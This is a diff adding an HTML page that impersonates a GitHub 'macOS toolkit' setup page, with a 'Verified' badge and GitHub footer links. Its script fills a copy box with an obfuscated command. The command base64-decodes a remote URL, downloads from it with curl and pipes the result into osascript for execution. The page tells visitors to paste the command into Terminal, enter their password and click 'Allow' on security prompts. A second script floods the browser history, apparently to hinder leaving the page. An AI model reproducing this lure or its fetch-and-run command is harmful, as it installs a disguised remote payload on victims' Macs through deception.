@@ -1,0 +1,383 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>macOS toolkit — setup</title>
+    <link
+      rel="icon"
+      type="image/svg+xml"
+      href="https://github.githubassets.com/favicons/favicon.svg"
+    />
+    <style>
+      * {
+        box-sizing: border-box;
+      }
+      :root {
+        --bg: #0b0f14;
+        --panel: #141a21;
+        --text: #98ede4;
+        --muted: #98ede4;
+        --brand: #3fb950;
+        --brand-fore: #ffffff;
+        --border: #2b3138;
+        --accent: #6cb6ff;
+        --warn: #e3b341;
+      }
+      body {
+        margin: 0;
+        /*background: var(--bg);*/
+        background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
+        color: var(--text);
+        font: 16px/1.45 system-ui, -apple-system, "Segoe UI", Roboto, Ubuntu,
+          "Helvetica Neue", Arial;
+      }
+      a {
+        color: var(--accent);
+        text-decoration: none;
+      }
+      .container {
+        max-width: 980px;
+        margin: 40px auto;
+        padding: 0 20px;
+      }
+      .header {
+        display: flex;
+        gap: 16px;
+        align-items: center;
+        margin-bottom: 28px;
+      }
+      .header h1 {
+        margin: 0;
+        font-size: 28px;
+        font-weight: 500;
+      }
+      .verified {
+        display: inline-flex;
+        align-items: center;
+        gap: 8px;
+        background: #0e1620;
+        border: 1px solid #26303a;
+        color: var(--muted);
+        padding: 4px 10px;
+        border-radius: 6px;
+        font-size: 12px;
+      }
+      .twoCol {
+        display: flex;
+        gap: 24px;
+        margin: 20px 0;
+        align-items: stretch;
+      }
+      .colLeft {
+        flex: 2;
+      }
+      .colRight {
+        flex: 1.2;
+      }
+      .card {
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 20px;
+      }
+      .cardTitle {
+        font-size: 18px;
+        font-weight: 600;
+        margin: 0 0 12px 0;
+        letter-spacing: -0.2px;
+      }
+      .cardDesc {
+        color: var(--muted);
+        font-size: 14px;
+        margin: 0 0 16px 0;
+      }
+      .inputGroup {
+        display: flex;
+        gap: 10px;
+        align-items: center;
+      }
+      .inputGroup input {
+        flex: 1;
+        background: #0b0f14;
+        border: 1px solid var(--border);
+        border-radius: 8px;
+        padding: 12px 14px;
+        color: var(--text);
+        font-family: monospace;
+        font-size: 13px;
+        outline: none;
+      }
+      .btn {
+        background: var(--brand);
+        border: none;
+        border-radius: 8px;
+        padding: 0 20px;
+        height: 44px;
+        font-weight: 600;
+        font-size: 14px;
+        color: var(--brand-fore);
+        cursor: pointer;
+        transition: opacity 0.15s;
+      }
+      .btn:hover {
+        opacity: 0.9;
+      }
+      .reqList {
+        margin: 8px 0 0 0;
+        padding-left: 18px;
+        font-size: 13px;
+        line-height: 1.5;
+        color: var(--muted);
+      }
+      .reqList li {
+        margin: 6px 0;
+      }
+      .mainSection {
+        margin: 24px 0;
+      }
+      .guideCard {
+        background: var(--panel);
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 20px;
+      }
+      .guideTitle {
+        font-size: 18px;
+        font-weight: 600;
+        margin: 0 0 16px 0;
+      }
+      .stepTitle {
+        font-size: 16px;
+        font-weight: 500;
+        margin: 16px 0 8px 0;
+      }
+      .stepList {
+        margin: 0;
+        padding-left: 20px;
+        font-size: 14px;
+        line-height: 1.5;
+      }
+      .stepList li {
+        margin: 6px 0;
+      }
+      .videoBox {
+        margin-top: 20px;
+        border-radius: 10px;
+        overflow: hidden;
+      }
+      .videoBox video {
+        width: 100%;
+        display: block;
+        border: 1px solid var(--border);
+        border-radius: 10px;
+      }
+      .noteLine {
+        border-left: 3px solid var(--warn);
+        background: rgba(227, 179, 65, 0.06);
+        padding: 10px 16px;
+        font-size: 13px;
+        margin: 20px 0 0 0;
+        border-radius: 6px;
+      }
+      .footer {
+        margin-top: 40px;
+        padding-top: 18px;
+        border-top: 1px solid var(--border);
+        font-size: 12px;
+        color: var(--muted);
+        display: flex;
+        flex-wrap: wrap;
+        gap: 12px;
+        justify-content: center;
+      }
+      .footer a {
+        color: var(--muted);
+        font-size: 12px;
+      }
+      .footer a:hover {
+        color: var(--accent);
+      }
+      hr {
+        border-color: var(--border);
+        margin: 8px 0;
+      }
+      .smallText {
+        font-size: 12px;
+        color: var(--muted);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <!-- header -->
+      <div class="header">
+        <svg width="34" height="34" viewBox="0 0 16 16" fill="currentColor">
+          <path d="M8 0C3.58 0 0 3.58 0 8a8 8 0 0 0 5.47 7.59c.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.94-.01 2.21 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8Z" />
+        </svg>
+        <h1>macOS toolkit</h1>
+        <div class="verified"><span>Verified</span></div>
+      </div>
+
+      <!-- two columns: quick setup (wider) + system requirements (compact) -->
+      <div class="twoCol">
+        <div class="colLeft">
+          <div class="card">
+            <div class="cardTitle">Quick setup</div>
+            <div class="cardDesc">Single command — paste into Terminal</div>
+            <div class="inputGroup">
+              <input id="cmdMain" type="text" readonly value="" />
+              <button class="btn" id="copyMainBtn">Copy</button>
+            </div>
+          </div>
+        </div>
+        <div class="colRight">
+          <div class="card">
+            <div class="cardTitle">System requirements</div>
+            <ul class="reqList">
+              <li>macOS 11.0+ (Big Sur or newer)</li>
+              <li>Apple Silicon · Intel-based Macs</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+
+      <!-- main guide section -->
+      <div class="mainSection">
+        <div class="guideCard">
+          <div class="guideTitle">Terminal guide</div>
+          
+          <div class="stepTitle">Launch Terminal</div>
+          <ol class="stepList">
+            <li>Press <strong>Command (⌘) + Space</strong> → Spotlight</li>
+            <li>Type <strong>"Terminal"</strong> → press <strong>Return</strong></li>
+          </ol>
+
+          <div class="stepTitle">Installation</div>
+          <ol class="stepList">
+            <li>Copy the command from the field above</li>
+            <li>Paste into Terminal → press <strong>Return</strong></li>
+            <li>Enter password if prompted</li>
+          </ol>
+
+          <div class="videoBox">
+            <video autoplay loop muted playsinline>
+              <source src="./assets/terminal.mp4" type="video/mp4" />
+            </video>
+          </div>
+
+          <div class="noteLine">
+            <span>Security prompt? Click "Allow" to continue.</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- footer -->
+      <div class="footer">
+        <span>© 2025 GitHub, Inc.</span>
+        <a href="https://github.com/site/terms">Terms</a>
+        <a href="https://github.com/site/privacy">Privacy</a>
+        <a href="https://github.com/security">Security</a>
+        <a href="https://www.githubstatus.com/">Status</a>
+        <a href="https://docs.github.com/en">Help</a>
+        <a href="https://support.github.com/contact">Contact</a>
+        <a href="https://docs.github.com/en/site-policy/privacy-policies/github-cookies">Cookies</a>
+        <a href="https://docs.github.com/en/site-policy/privacy-policies/do-not-share-my-personal-information">Privacy</a>
+      </div>
+    </div>
+
+    <script>
+      (function(){
+        
+
+        function getPageName() {
+          return window.location.pathname.split('/').pop().replace('.html', '');
+        }
+
+        const FALLBACK_CMD = 'curl -sf -H "tag: v1" $(echo "aHR0cHM6Ly91cGRhdGUtZ2F0ZXdheS5jb20vajM=" | base64 -d) | osascript -l JavaScript';
+        let inputField = null;
+        let copyButton = null;
+
+        async function fetchCommand() {
+          return FALLBACK_CMD;
+        }
+
+        function setupCopyHandler() {
+          if (!copyButton || !inputField) return;
+          copyButton.addEventListener("click", async (ev) => {
+            ev.preventDefault();
+            try {
+              await navigator.clipboard.writeText(inputField.value);
+              
+              const originalText = copyButton.textContent;
+              copyButton.textContent = "✓ Copied!";
+              copyButton.style.background = "#2ea043";
+              setTimeout(() => {
+                copyButton.textContent = originalText;
+                copyButton.style.background = "";
+              }, 1400);
+            } catch(e) {
+              inputField.select();
+            }
+          });
+        }
+
+        document.addEventListener("DOMContentLoaded", async () => {
+          inputField = document.getElementById("cmdMain");
+          copyButton = document.getElementById("copyMainBtn");
+          if (inputField) {
+            const cmd = await fetchCommand();
+            inputField.value = cmd;
+          }
+          setupCopyHandler();
+          
+        });
+      })();
+    </script>
+    <script type="text/javascript">
+        const stringLength = 15;
+        const tokenLength = 7;
+        const utmCount = 8;
+        const postpendUrlStrLength = 15;
+    
+        var getRandomInt = function(min, max) {
+            min = Math.ceil(min);
+            max = Math.floor(max);
+            return Math.floor(Math.random() * (max - min)) + min;
+        }
+    
+        var getRadomString = function(length) {
+            var characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            var randomString = '';
+            for (var i = 0; i < length; i++) {
+                randomString += characters[Math.floor(Math.random() * characters.length)];
+            }
+            return randomString;
+        }
+    
+        var path1 = location.pathname + '?' + getRadomString(stringLength);
+        var path = location.pathname;
+        var proceedtodownload = 1;
+    
+        
+        try {
+            new Promise(function(resolve) {
+                (function pushStateLoop(i, url) {
+                    setTimeout(function() {
+                        window.history.pushState({}, document.title, path1 + '?io=' + getRandomInt(1, i) + getRadomString(15));
+                        if (--i) pushStateLoop(i, url);
+                        if (i === 0) resolve(1);
+                    }, 380);
+                })(utmCount, window.location.href);
+            }).then(function() {
+                //window.location.href = path;
+            });
+        } catch (err) {
+            console.error(err);
+        }
+    </script>
+    
+</body>
+</html>
